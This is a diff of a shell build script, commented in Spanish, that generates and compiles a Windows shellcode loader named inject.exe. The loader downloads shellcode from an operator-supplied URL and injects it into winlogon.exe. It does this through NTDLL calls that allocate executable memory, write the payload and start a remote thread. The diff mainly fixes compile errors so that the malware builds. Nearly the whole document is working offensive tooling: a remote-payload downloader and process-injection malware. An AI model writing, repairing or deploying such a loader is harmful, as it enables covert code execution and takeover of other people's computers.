@@ -7,8 +7,9 @@ MAX_SIZE=2097152
 XOR_KEY=0x42
 PROCESS_NAME="winlogon.exe"
 FILE_C="loader_windows_infect.c"
+
 usage() {
-    echo "Usage: $0 --target <linux|windows> --url <url>"
+    echo "Usage: $0 --target <windows> --url <url>"
     exit 1
 }
 
@@ -39,6 +40,7 @@ done
 ESCAPED_URL=$(printf '%s' "$URL" | sed 's/\\/\\\\/g; s/"/\\"/g')
 ESCAPED_UA=$(printf '%s' "$USER_AGENT" | sed 's/\\/\\\\/g; s/"/\\"/g')
 
+# === Generamos el archivo C con todas las correcciones ===
 cat > "$FILE_C" << 'EOF'
 // inject_remote_download.c
 #include <winsock2.h>
@@ -60,7 +62,6 @@ const size_t MAX_RESPONSE  = $MAX_SIZE;
 // === Definiciones manuales para MinGW ===
 #ifndef _NTDEF_H
 #define _NTDEF_H
-
 typedef long NTSTATUS;
 #ifndef STATUS_SUCCESS
 #define STATUS_SUCCESS 0x00000000L
@@ -68,18 +69,15 @@ typedef long NTSTATUS;
 #ifndef NTAPI
 #define NTAPI __stdcall
 #endif
-
 typedef struct _UNICODE_STRING {
     USHORT Length;
     USHORT MaximumLength;
     PWSTR  Buffer;
 } UNICODE_STRING, *PUNICODE_STRING;
-
 typedef struct _CLIENT_ID {
     HANDLE UniqueProcess;
     HANDLE UniqueThread;
 } CLIENT_ID, *PCLIENT_ID;
-
 typedef struct _OBJECT_ATTRIBUTES {
     ULONG Length;
     HANDLE RootDirectory;
@@ -88,9 +86,7 @@ typedef struct _OBJECT_ATTRIBUTES {
     PVOID SecurityDescriptor;
     PVOID SecurityQualityOfService;
 } OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;
-
 typedef const OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;
-
 #define InitializeObjectAttributes(p, n, a, r, s) \
     do { \
         (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
@@ -100,7 +96,25 @@ typedef const OBJECT_ATTRIBUTES *PCOBJECT_ATTRIBUTES;
         (p)->SecurityDescriptor = s; \
         (p)->SecurityQualityOfService = NULL; \
     } while(0)
+#endif
 
+// === Definición crítica: PS_ATTRIBUTE_LIST (falta en MinGW) ===
+#ifndef _PS_ATTRIBUTE_LIST_DEFINED
+#define _PS_ATTRIBUTE_LIST_DEFINED
+typedef struct _PS_ATTRIBUTE {
+    ULONG_PTR Attribute;
+    SIZE_T    Size;
+    union {
+        ULONG_PTR Value;
+        PVOID     ValuePtr;
+    } u1;
+    PSIZE_T   ReturnLength;
+} PS_ATTRIBUTE, *PPS_ATTRIBUTE;
+
+typedef struct _PS_ATTRIBUTE_LIST {
+    SIZE_T       TotalLength;
+    PS_ATTRIBUTE Attributes[1];
+} PS_ATTRIBUTE_LIST, *PPS_ATTRIBUTE_LIST;
 #endif
 
 // === Prototipos NTDLL ===
@@ -125,6 +139,7 @@ typedef NTSTATUS (NTAPI *NtWriteVirtualMemory_)(
     SIZE_T NumberOfBytesToWrite,
     PSIZE_T NumberOfBytesWritten);
 
+// Prototipo CORREGIDO de NtCreateThreadEx
 typedef NTSTATUS (NTAPI *NtCreateThreadEx_)(
     PHANDLE ThreadHandle,
     ACCESS_MASK DesiredAccess,
@@ -141,12 +156,14 @@ typedef NTSTATUS (NTAPI *NtCreateThreadEx_)(
 typedef NTSTATUS (NTAPI *NtClose_)(
     HANDLE Handle);
 
-static NtOpenProcess_      NtOpenProcessF = NULL;
+// === Punteros a funciones ===
+static NtOpenProcess_           NtOpenProcessF = NULL;
 static NtAllocateVirtualMemory_ NtAllocateVirtualMemoryF = NULL;
 static NtWriteVirtualMemory_    NtWriteVirtualMemoryF = NULL;
 static NtCreateThreadEx_        NtCreateThreadExF = NULL;
 static NtClose_                 NtCloseF = NULL;
 
+// === Macro para cargar funciones de ntdll ===
 #define populatePrototype(x, dll) \
     do { Nt##x##F = (Nt##x##_) GetProcAddress(dll, "Nt" #x); } while(0)
 
@@ -182,7 +199,6 @@ int extract_shellcode(const char* input, size_t len, unsigned char** out) {
     unsigned char* sc = malloc(1024);
     size_t capacity = 1024;
     size_t count = 0;
-
     for (size_t i = 0; i < len - 3; i++) {
         if (input[i] == '\\' && input[i+1] == 'x' && i+3 < len) {
             char hex[3] = { input[i+2], input[i+3], '\0' };
@@ -200,7 +216,6 @@ int extract_shellcode(const char* input, size_t len, unsigned char** out) {
             }
         }
     }
-
     if (count == 0) { free(sc); return 0; }
     *out = sc;
     return count;
@@ -210,17 +225,15 @@ int extract_shellcode(const char* input, size_t len, unsigned char** out) {
 DWORD get_pid_by_name(const char* proc_name) {
     HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
-
     PROCESSENTRY32 pe32;
     pe32.dwSize = sizeof(PROCESSENTRY32);
-
     if (Process32First(hSnapshot, &pe32)) {
         do {
             if (_stricmp(pe32.szExeFile, proc_name) == 0) {
                 CloseHandle(hSnapshot);
                 return pe32.th32ProcessID;
             }
-        } while (Process32Next(&pe32));
+        } while (Process32Next(hSnapshot, &pe32));  // ✅ Corregido: ahora lleva 2 argumentos
     }
     CloseHandle(hSnapshot);
     return 0;
@@ -236,17 +249,14 @@ int main() {
     const char* proto = strstr(SHELLCODE_URL, "://");
     if (!proto) return 1;
     proto += 3;
-
     const char* path = strchr(proto, '/');
     if (!path) path = "/";
     size_t path_len = strlen(path);
-
     char host[256] = {0};
     int port = 80;
     size_t host_len = path - proto;
     if (host_len >= sizeof(host)) host_len = sizeof(host) - 1;
     strncpy(host, proto, host_len);
-
     char* colon = strchr(host, ':');
     if (colon) {
         port = atoi(colon + 1);
@@ -256,7 +266,6 @@ int main() {
     struct hostent* he = gethostbyname(host);
     if (!he) return 1;
     struct in_addr* addr = (struct in_addr*)he->h_addr_list[0];
-
     SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock == INVALID_SOCKET) return 1;
 
@@ -279,13 +288,11 @@ int main() {
         "Connection: close\r\n"
         "\r\n",
         path, host, port, USER_AGENT);
-
     send(sock, request, strlen(request), 0);
 
     Buffer response = {0};
     char buffer[4096];
     int bytes;
-
     while ((bytes = recv(sock, buffer, sizeof(buffer)-1, 0)) > 0) {
         buffer[bytes] = '\0';
         if (!buffer_append(&response, buffer, bytes)) break;
@@ -303,7 +310,6 @@ int main() {
     unsigned char* shellcode;
     int sc_len = extract_shellcode(body, response.buffer + response.size - body, &shellcode);
     free(response.buffer);
-
     if (sc_len <= 0) {
         return 1;
     }
@@ -339,13 +345,11 @@ int main() {
     HANDLE hProcess = NULL;
     OBJECT_ATTRIBUTES objAttrs;
     InitializeObjectAttributes(&objAttrs, NULL, 0, NULL, NULL);
-
     CLIENT_ID clientId = { (HANDLE)(ULONG_PTR)pid, NULL };
 
     NTSTATUS status = NtOpenProcessF(&hProcess,
                                      PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD,
                                      &objAttrs, &clientId);
-
     if (status != STATUS_SUCCESS) {
         free(shellcode);
         return 1;
@@ -353,7 +357,6 @@ int main() {
 
     SIZE_T size = sc_len;
     PVOID remoteMem = NULL;
-
     status = NtAllocateVirtualMemoryF(hProcess, &remoteMem, 0, &size,
                                       MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (status != STATUS_SUCCESS) {
@@ -380,13 +383,12 @@ int main() {
     // === 5. Limpiar ===
     NtCloseF(hThread);
     NtCloseF(hProcess);
-
     printf("Inyección exitosa en PID: %lu\n", pid);
     return 0;
 }
-
 EOF
 
+# === Reemplazar placeholders ===
 sed -i "s|__XOR_KEY__|$XOR_KEY|g" "$FILE_C"
 sed -i "s|\$ESCAPED_URL|$ESCAPED_URL|g" "$FILE_C"
 sed -i "s|\$PROCESS_NAME|$PROCESS_NAME|g" "$FILE_C"
@@ -394,4 +396,13 @@ sed -i "s|\$ESCAPED_UA|$ESCAPED_UA|g" "$FILE_C"
 sed -i "s|\$TIMEOUT|$TIMEOUT|g" "$FILE_C"
 sed -i "s|\$MAX_SIZE|$MAX_SIZE|g" "$FILE_C"
 
-x86_64-w64-mingw32-gcc loader_windows_infect.c -o inject.exe -lntdll -s -O2
+# === Compilar ===
+x86_64-w64-mingw32-gcc "$FILE_C" -o inject.exe -lws2_32 -s -O2
+
+# === Mensaje final ===
+if [ -f "inject.exe" ]; then
+    echo "[+] Compilación exitosa: inject.exe generado"
+else
+    echo "[-] Error en la compilación"
+    exit 1
+fi
